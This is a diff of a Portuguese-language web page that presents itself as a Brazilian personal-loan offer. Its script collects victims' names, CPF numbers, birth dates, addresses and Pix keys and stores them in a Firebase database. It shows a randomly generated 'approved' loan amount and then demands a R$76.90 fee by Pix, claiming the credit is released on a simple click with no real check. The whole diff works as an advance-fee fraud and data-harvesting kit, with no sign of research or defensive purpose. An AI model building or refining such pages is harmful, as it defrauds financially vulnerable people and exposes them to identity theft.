+                    </button>
+                    <div class="pix-copia" id="pixCode">
+                        ${pixCopiaCola}
+                    </div>
+                    <button class="btn-confirmar" onclick="confirmarPagamento()">
+                        <i class="fas fa-check-circle"></i> Confirmar pagamento
+                    </button>
+                    <div class="aviso">
+                        <i class="fas fa-clock"></i> Após confirmação, o crédito será liberado em até 5 minutos
+                    </div>
+                </div>
+                <script>
+                    new QRCode(document.getElementById("qrcode"), {
+                        text: "${pixCopiaCola}",
+                        width: 200,
+                        height: 200,
+                        colorDark: "#002776",
+                        colorLight: "#ffffff",
+                        correctLevel: QRCode.CorrectLevel.H
+                    });
+                    
+                    function copiarPix() {
+                        const texto = "${pixCopiaCola}";
+                        navigator.clipboard.writeText(texto).then(() => {
+                            const btn = event.target.closest('.btn-copiar');
+                            const originalText = btn.innerHTML;
+                            btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                            setTimeout(() => {
+                                btn.innerHTML = originalText;
+                            }, 2000);
+                        }).catch(() => {
+                            alert('Clique no código e copie manualmente');
+                        });
+                    }
+                    
+                    function confirmarPagamento() {
+                        if (confirm("Confirmar pagamento da taxa de R$ 76,90? Após confirmar, o crédito será liberado.")) {
+                            window.opener.pagamentoConfirmado();
+                            window.close();
+                        }
+                    }
+                <\/script>
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+            </body>
+            </html>
+        `);
+        novaAba.document.close();
+    }
+
+    window.pagamentoConfirmado = async function() {
+        showLoading();
+        
+        const contrato = {
+            valorLiberado: valorAprovado,
+            parcelas: parcelasEscolhidas,
+            taxaPaga: 76.90,
+            status: "CONTRATADO - CRÉDITO LIBERADO",
+            timestamp: new Date().toISOString(),
+            cliente: clienteData
+        };
+        await database.ref('contratos/' + clienteData.cpf).set(contrato);
+        
+        const selectedRadio = document.querySelector('input[name="pixType"]:checked');
+        let chaveDigitada = "";
+        const tipo = selectedRadio.value;
+        if (tipo === 'cpf') chaveDigitada = document.getElementById('pixCpf').value;
+        else if (tipo === 'email') chaveDigitada = document.getElementById('pixEmail').value;
+        else if (tipo === 'phone') chaveDigitada = document.getElementById('pixPhone').value;
+        else if (tipo === 'aleatoria') chaveDigitada = document.getElementById('pixAleatoria').value;
+        
+        const chaveCompleta = `${tipo.toUpperCase()}: ${chaveDigitada}`;
+        
+        hideLoading();
+        mostrarComprovante(chaveCompleta);
+    };
+
+    const page1 = document.getElementById('page1'), page2 = document.getElementById('page2'), page3 = document.getElementById('page3'), page4 = document.getElementById('page4');
+    const steps = [document.getElementById('step1Label'), document.getElementById('step2Label'), document.getElementById('step3Label'), document.getElementById('step4Label')];
+    
+    function showPage(n) {
+        showLoading();
+        setTimeout(() => {
+            [page1, page2, page3, page4].forEach((p, idx) => p.classList.toggle('active-page', idx+1 === n));
+            steps.forEach((step, idx) => step.classList.toggle('active', idx+1 === n));
+            hideLoading();
+        }, 200);
+    }
+
+    function validarCPF(cpfStr) {
+        let cpf = cpfStr.replace(/\D/g, '');
+        if (cpf.length !== 11) return false;
+        if (/^(\d)\1+$/.test(cpf)) return false;
+        let soma = 0, resto;
+        for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+        resto = (soma * 10) % 11;
+        if (resto === 10 || resto === 11) resto = 0;
+        if (resto !== parseInt(cpf.substring(9, 10))) return false;
+        soma = 0;
+        for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+        resto = (soma * 10) % 11;
+        if (resto === 10 || resto === 11) resto = 0;
+        return resto === parseInt(cpf.substring(10, 11));
+    }
+
+    async function buscarEndereco(cepRaw) {
+        const cep = cepRaw.replace(/\D/g, '');
+        if (cep.length !== 8) throw new Error('CEP inválido');
+        const url = `https://cep.awesomeapi.com.br/json/${cep}`;
+        const resp = await fetch(url);
+        if (!resp.ok) throw new Error('CEP não encontrado');
+        const data = await resp.json();
+        return `${data.address} - ${data.district}, ${data.city} - ${data.state}`;
+    }
+
+    const cpfInput = document.getElementById('cpf');
+    const cpfErrorSpan = document.getElementById('cpfError');
+    cpfInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length > 11) val = val.slice(0,11);
+        if (val.length > 9) val = val.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+        else if (val.length > 6) val = val.replace(/^(\d{3})(\d{3})(\d{0,3})$/, '$1.$2.$3');
+        else if (val.length > 3) val = val.replace(/^(\d{3})(\d{0,3})$/, '$1.$2');
+        e.target.value = val;
+        if (val.replace(/\D/g, '').length === 11 && !validarCPF(val)) cpfErrorSpan.innerText = 'CPF inválido';
+        else cpfErrorSpan.innerText = '';
+    });
+
+    const cepField = document.getElementById('cep');
+    const addressField = document.getElementById('address');
+    cepField.addEventListener('blur', async () => {
+        if (cepField.value.replace(/\D/g, '').length !== 8) return;
+        try {
+            showLoading();
+            const endereco = await buscarEndereco(cepField.value);
+            addressField.value = endereco;
+            document.getElementById('cepError').innerText = '';
+        } catch (err) {
+            document.getElementById('cepError').innerText = 'CEP não encontrado';
+        } finally {
+            hideLoading();
+        }
+    });
+
+    document.getElementById('btnToCadastro').onclick = () => showPage(2);
+    document.getElementById('backPage1').onclick = () => showPage(1);
+    document.getElementById('backPage2').onclick = () => showPage(2);
+    document.getElementById('backPage3').onclick = () => showPage(3);
+
+    function atualizarParcelas() {
+        const qtd = parseInt(document.getElementById('parcelasSelect').value);
+        parcelasEscolhidas = qtd;
+        const parcelaValor = valorAprovado / qtd;
+        document.getElementById('parcelaValorDisplay').innerHTML = `R$ ${parcelaValor.toFixed(2)}`;
+        document.getElementById('parcelaDescricao').innerHTML = `${qtd}x mensais de R$ ${parcelaValor.toFixed(2)} • Total: R$ ${valorAprovado.toFixed(2)}`;
+    }
+
+    document.getElementById('btnValidarOferta').onclick = async () => {
+        const nome = document.getElementById('fullName').value.trim();
+        const cpfVal = cpfInput.value.replace(/\D/g, '');
+        const nasc = document.getElementById('birthDate').value;
+        const endereco = addressField.value;
+        
+        if (!nome || nome.split(' ').length < 2) { alert('Informe nome completo'); return; }
+        if (!validarCPF(cpfVal)) { alert('CPF inválido'); return; }
+        if (!nasc) { alert('Data de nascimento obrigatória'); return; }
+        if (!endereco) { alert('Informe um CEP válido'); return; }
+        
+        clienteData = { nome, cpf: cpfVal, nascimento: nasc, endereco, dataSimulacao: new Date().toISOString() };
+        showLoading();
+        await database.ref('simulacoes/' + cpfVal).set(clienteData);
+        
+        valorAprovado = Math.floor(Math.random() * (10000 - 3000 + 1) + 3000);
+        document.getElementById('valorAprovadoSpan').innerHTML = `R$ ${valorAprovado.toFixed(2)}`;
+        
+        const parcelasSelect = document.getElementById('parcelasSelect');
+        parcelasSelect.innerHTML = '';
+        for (let i = 1; i <= 48; i++) {
+            const option = document.createElement('option');
+            option.value = i;
+            option.textContent = `${i}x - R$ ${(valorAprovado / i).toFixed(2)}`;
+            parcelasSelect.appendChild(option);
+        }
+        parcelasSelect.value = 12;
+        atualizarParcelas();
+        hideLoading();
+        showPage(3);
+    };
+    
+    document.getElementById('parcelasSelect').addEventListener('change', atualizarParcelas);
+    
+    document.getElementById('btnConfirmarParcelas').onclick = () => {
+        if (valorAprovado <= 0) { alert('Gere uma oferta primeiro'); showPage(2); return; }
+        showPage(4);
+    };
+    
+    const pixOptions = document.querySelectorAll('.pix-option');
+    pixOptions.forEach(opt => {
+        const radio = opt.querySelector('input[type="radio"]');
+        radio.addEventListener('change', () => {
+            pixOptions.forEach(o => o.classList.remove('selected'));
+            opt.classList.add('selected');
+            document.querySelectorAll('.pix-input-field').forEach(f => f.classList.remove('show'));
+            const type = radio.value;
+            if (type === 'cpf') document.getElementById('cpfInputField').classList.add('show');
+            if (type === 'email') document.getElementById('emailInputField').classList.add('show');
+            if (type === 'phone') document.getElementById('phoneInputField').classList.add('show');
+            if (type === 'aleatoria') document.getElementById('aleatoriaInputField').classList.add('show');
+        });
+    });
+    
+    document.getElementById('btnFinalizarTaxa').onclick = () => {
+        const selectedRadio = document.querySelector('input[name="pixType"]:checked');
+        if (!selectedRadio) { alert('Selecione o tipo de chave Pix'); return; }
+        let chaveDigitada = "";
+        const tipo = selectedRadio.value;
+        if (tipo === 'cpf') chaveDigitada = document.getElementById('pixCpf').value;
+        else if (tipo === 'email') chaveDigitada = document.getElementById('pixEmail').value;
+        else if (tipo === 'phone') chaveDigitada = document.getElementById('pixPhone').value;
+        else if (tipo === 'aleatoria') chaveDigitada = document.getElementById('pixAleatoria').value;
+        
+        if (!chaveDigitada.trim()) { alert(`Digite a chave Pix (${tipo})`); return; }
+        
+        clienteData.chavePix = `${tipo.toUpperCase()}: ${chaveDigitada}`;
+        abrirPagamentoPix();
+    };
+</script>
 </body>
 </html>
